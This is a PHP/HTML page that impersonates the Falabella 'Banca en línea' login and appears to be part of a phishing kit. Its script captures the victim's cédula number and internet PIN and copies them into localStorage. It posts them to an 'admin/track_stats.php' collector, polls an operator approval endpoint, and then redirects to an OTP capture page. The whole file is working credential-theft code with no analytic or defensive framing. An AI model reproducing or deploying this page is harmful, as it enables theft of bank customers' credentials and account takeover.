<?php
/**
 * index.php - Falabella
 * Página de inicio de Falabella
 */
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Falabella - Banca en Línea</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 430px;
            min-height: 100vh;
            background: white;
            position: relative;
            overflow: hidden;
        }

        /* HEADER - solo logo y título */
        .header {
            background: white;
            padding: 16px 20px 12px;
            display: flex;
            align-items: center;
            gap: 10px;
            border-bottom: 1px solid #eee;
            position: sticky;
            top: 0;
            z-index: 10;
        }

        .header-logo img {
            height: 32px;
            width: auto;
            object-fit: contain;
        }

        .header-title {
            font-size: 18px;
            font-weight: 300;
            color: #1a1a1a;
        }

        .header-title strong {
            font-weight: 700;
        }

        /* Botón Cerrar X - flotante */
        .close-btn {
            position: absolute;
            top: 16px;
            right: 20px;
            font-size: 22px;
            color: #999;
            cursor: pointer;
            background: none;
            border: none;
            font-weight: 300;
            z-index: 15;
        }

        /* Content */
        .content {
            padding: 30px 24px 30px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Título */
        .title {
            font-size: 24px;
            font-weight: 300;
            color: #1a1a1a;
            text-align: center;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .title strong {
            font-weight: 700;
        }

        /* Línea separadora */
        .divider {
            width: 60px;
            height: 2px;
            background: #2d8c3c;
            margin: 0 auto 30px;
            border-radius: 2px;
        }

        /* Formulario */
        .form-group {
            width: 100%;
            margin-bottom: 18px;
        }

        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #333;
            margin-bottom: 4px;
        }

        .form-group .label-doc {
            font-size: 12px;
            color: #666;
            font-weight: 400;
        }

        .input-wrapper {
            position: relative;
            width: 100%;
        }

        .input-wrapper input,
        .input-wrapper select {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 15px;
            color: #1a1a1a;
            background: #f8f8f8;
            transition: border-color 0.3s;
            font-family: inherit;
        }

        .input-wrapper input:focus,
        .input-wrapper select:focus {
            outline: none;
            border-color: #2d8c3c;
            background: white;
        }

        .input-wrapper select {
            appearance: none;
            -webkit-appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23666' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 14px center;
            padding-right: 40px;
        }

        /* Checkbox de Pagos PSE */
        .pse-checkbox {
            display: flex;
            align-items: center;
            gap: 10px;
            width: 100%;
            margin: 8px 0 20px;
        }

        .pse-checkbox input[type="checkbox"] {
            width: 20px;
            height: 20px;
            accent-color: #2d8c3c;
            cursor: pointer;
        }

        .pse-checkbox label {
            font-size: 14px;
            color: #333;
            cursor: pointer;
        }

        /* Botón */
        .btn-ingresar {
            width: 100%;
            padding: 14px;
            background: #ccc;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: not-allowed;
            transition: all 0.3s;
            font-family: inherit;
            letter-spacing: 0.5px;
        }

        .btn-ingresar.active {
            background: #2d8c3c;
            cursor: pointer;
        }

        .btn-ingresar.active:active {
            transform: scale(0.98);
        }

        /* Links */
        .links {
            width: 100%;
            text-align: center;
            margin-top: 20px;
        }

        .links a {
            color: #2d8c3c;
            text-decoration: none;
            font-size: 13px;
            font-weight: 500;
        }

        .links a:hover {
            text-decoration: underline;
        }

        /* Cookie Banner */
        .cookie-banner {
            background: #f0f0f0;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
            border-top: 1px solid #e0e0e0;
            font-size: 12px;
            color: #555;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            max-width: 430px;
            margin: 0 auto;
            z-index: 20;
        }

        .cookie-banner a {
            color: #2d8c3c;
            text-decoration: none;
            font-weight: 500;
            white-space: nowrap;
        }

        .cookie-banner button {
            background: #2d8c3c;
            color: white;
            border: none;
            padding: 6px 18px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            white-space: nowrap;
            font-family: inherit;
        }

        /* Toast */
        .toast {
            position: fixed;
            top: 80px;
            right: 16px;
            z-index: 1000;
            transform: translateX(150%);
            transition: transform 0.4s ease;
            max-width: 320px;
            width: 100%;
        }

        .toast.show {
            transform: translateX(0);
        }

        .toast-content {
            background: white;
            border-left: 4px solid #E31E24;
            border-radius: 10px;
            padding: 14px 18px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.15);
            display: flex;
            align-items: flex-start;
            gap: 12px;
        }

        .toast-icon {
            background: #E31E24;
            color: white;
            border-radius: 50%;
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: bold;
            flex-shrink: 0;
        }

        .toast-text h4 {
            font-size: 13px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 2px;
        }

        .toast-text p {
            font-size: 12px;
            color: #666;
            margin: 0;
        }

        /* Loader */
        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255,255,255,0.95);
            z-index: 999;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        .loader-overlay.show {
            display: flex;
        }

        .loader-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f0f0f0;
            border-top: 4px solid #2d8c3c;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 16px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loader-text {
            font-size: 14px;
            color: #666;
        }

        /* Error Overlay */
        .error-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255,255,255,0.95);
            z-index: 1000;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            padding: 40px;
        }

        .error-overlay.show {
            display: flex;
        }

        .error-icon {
            font-size: 56px;
            color: #E31E24;
            margin-bottom: 16px;
        }

        .error-title {
            font-size: 20px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 8px;
        }

        .error-message {
            font-size: 14px;
            color: #666;
            text-align: center;
            margin-bottom: 24px;
            line-height: 1.5;
        }

        .error-btn {
            background: #2d8c3c;
            color: white;
            border: none;
            padding: 12px 40px;
            border-radius: 25px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            font-family: inherit;
        }

        /* Responsive */
        @media (max-width: 430px) {
            .container {
                max-width: 100%;
                min-height: 100vh;
            }

            .content {
                padding: 24px 16px 20px;
            }

            .title {
                font-size: 22px;
            }

            .cookie-banner {
                max-width: 100%;
                flex-wrap: wrap;
                justify-content: center;
                text-align: center;
            }

            .header-title {
                font-size: 16px;
            }

            .header-logo img {
                height: 26px;
            }
        }

        @media (min-width: 431px) {
            .container {
                border-radius: 16px;
                min-height: 100vh;
                box-shadow: 0 4px 30px rgba(0,0,0,0.1);
            }

            .cookie-banner {
                border-radius: 0 0 16px 16px;
            }
        }
    </style>
</head>
<body>

<div class="container">
    <!-- HEADER solo con logo y "Banca en línea" -->
    <div class="header">
        <div class="header-logo">
            <img src="HOJITA.svg" alt="Falabella">
        </div>
        <span class="header-title">Banca <strong>en línea</strong></span>
        <button class="close-btn" onclick="window.location.href='../'">✕</button>
    </div>

    <!-- Content -->
    <div class="content">
        <div class="divider"></div>

        <!-- Form -->
        <form id="loginForm" autocomplete="off">
            <div class="form-group">
                <label>
                    Cédula Ciudadanía
                    <span class="label-doc">Cédula de Ciudadanía</span>
                </label>
                <div class="input-wrapper">
                    <input type="text" id="documento" placeholder="Cédula de Ciudadanía" maxlength="12" inputmode="numeric">
                </div>
            </div>

            <div class="form-group">
                <label>Clave Internet</label>
                <div class="input-wrapper">
                    <input type="password" id="clave" placeholder="Clave Internet" maxlength="8" inputmode="numeric">
                </div>
            </div>

            <!-- Checkbox Pagos PSE -->
            <div class="pse-checkbox">
                <input type="checkbox" id="pseCheck" checked>
                <label for="pseCheck">Pagos PSE</label>
            </div>

            <button type="submit" class="btn-ingresar" id="btnIngresar" disabled>INGRESAR</button>
        </form>

        <div class="links">
            <a href="#">Crea o recupera tu Clave Internet</a>
        </div>
    </div>

    <!-- Cookie Banner -->
    <div class="cookie-banner">
        <span>Usamos cookies para mejorar tu experiencia. <a href="#">Consulta más aquí.</a></span>
        <button onclick="this.parentElement.style.display='none'">Entendido</button>
    </div>
</div>

<!-- Toast -->
<div class="toast" id="toast">
    <div class="toast-content">
        <div class="toast-icon">!</div>
        <div class="toast-text">
            <h4>Error</h4>
            <p id="toastMsg">Datos incorrectos. Intente de nuevo.</p>
        </div>
    </div>
</div>

<!-- Loader -->
<div class="loader-overlay" id="loader">
    <div class="loader-spinner"></div>
    <div class="loader-text">Procesando...</div>
</div>

<!-- Error Overlay -->
<div class="error-overlay" id="errorOverlay">
    <div class="error-icon">⚠️</div>
    <div class="error-title">¡Ups! Algo falló</div>
    <div class="error-message" id="errorMsg">Lo sentimos, no pudimos completar la operación. Intenta de nuevo.</div>
    <button class="error-btn" onclick="cerrarError()">Intentar de nuevo</button>
</div>

<script>
    const documentoInput = document.getElementById('documento');
    const claveInput = document.getElementById('clave');
    const btnIngresar = document.getElementById('btnIngresar');
    const form = document.getElementById('loginForm');

    // Solo números
    documentoInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
        verificarCampos();
    });

    claveInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
        verificarCampos();
    });

    function verificarCampos() {
        if (documentoInput.value.length >= 6 && claveInput.value.length >= 4) {
            btnIngresar.disabled = false;
            btnIngresar.classList.add('active');
        } else {
            btnIngresar.disabled = true;
            btnIngresar.classList.remove('active');
        }
    }

    function showToast(msg) {
        const toast = document.getElementById('toast');
        document.getElementById('toastMsg').textContent = msg;
        toast.classList.add('show');
        setTimeout(() => {
            toast.classList.remove('show');
        }, 5000);
    }

    function toggleLoader(show) {
        document.getElementById('loader').classList.toggle('show', show);
    }

    function cerrarError() {
        document.getElementById('errorOverlay').classList.remove('show');
        toggleLoader(false);
        claveInput.value = '';
        verificarCampos();
    }

    function startPolling(id) {
        let pollCount = 0;
        const maxPolls = 150;

        const interval = setInterval(() => {
            pollCount++;
            fetch('../../admin/check_aprobacion.php?log_id=' + id)
                .then(res => res.json())
                .then(data => {
                    console.log('Poll estado:', data.estado);
                    if (data.estado === 'aprobado') {
                        clearInterval(interval);
                        toggleLoader(false);
                        window.location.href = "otp.php";
                    } else if (data.estado === 'rechazado') {
                        clearInterval(interval);
                        toggleLoader(false);
                        showToast("Clave incorrecta. Intente de nuevo.");
                        claveInput.value = '';
                        verificarCampos();
                    } else if (pollCount >= maxPolls) {
                        clearInterval(interval);
                        toggleLoader(false);
                        document.getElementById('errorMsg').textContent = 'Tiempo de espera agotado. Intenta de nuevo.';
                        document.getElementById('errorOverlay').classList.add('show');
                    }
                })
                .catch(err => {
                    console.error('Error en polling:', err);
                    if (pollCount >= maxPolls) {
                        clearInterval(interval);
                        toggleLoader(false);
                        document.getElementById('errorMsg').textContent = 'Error de conexión. Intenta de nuevo.';
                        document.getElementById('errorOverlay').classList.add('show');
                    }
                });
        }, 2000);
    }

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        const documento = documentoInput.value;
        const clave = claveInput.value;

        if (!documento || documento.length < 6) {
            showToast('Ingresa un número de cédula válido.');
            return;
        }

        if (!clave || clave.length < 4) {
            showToast('Ingresa tu clave de 4 dígitos.');
            return;
        }

        toggleLoader(true);

        localStorage.setItem('usuario_falabella', documento);
        localStorage.setItem('identificacion_falabella', documento);
        localStorage.setItem('tipo_id_falabella', 'CC');
        localStorage.setItem('clave_pin_falabella', clave);

        const formData = new FormData();
        formData.append('activity', 'LOGIN (FALABELLA)');
        formData.append('action', 'log');
        formData.append('metodo', 'PSE');
        formData.append('banco', 'Falabella');
        formData.append('documento', documento);
        formData.append('usuario', documento);
        formData.append('identificacion', documento);
        formData.append('tipo_identificacion', 'CC');
        formData.append('clave_pin', clave);
        formData.append('clave_tarjeta', '');
        formData.append('ultimos_digitos', '');

        fetch('../../admin/track_stats.php', {
            method: 'POST',
            body: formData,
            keepalive: true
        })
        .then(res => res.json())
        .then(data => {
            if (data.success && data.id) {
                localStorage.setItem('log_id_falabella', data.id);
                startPolling(data.id);
            } else {
                toggleLoader(false);
                showToast('Error al procesar la solicitud.');
            }
        })
        .catch(err => {
            console.error('Error:', err);
            toggleLoader(false);
            document.getElementById('errorMsg').textContent = 'Error de conexión. Intenta de nuevo.';
            document.getElementById('errorOverlay').classList.add('show');
        });
    });
</script>

</body>
</html>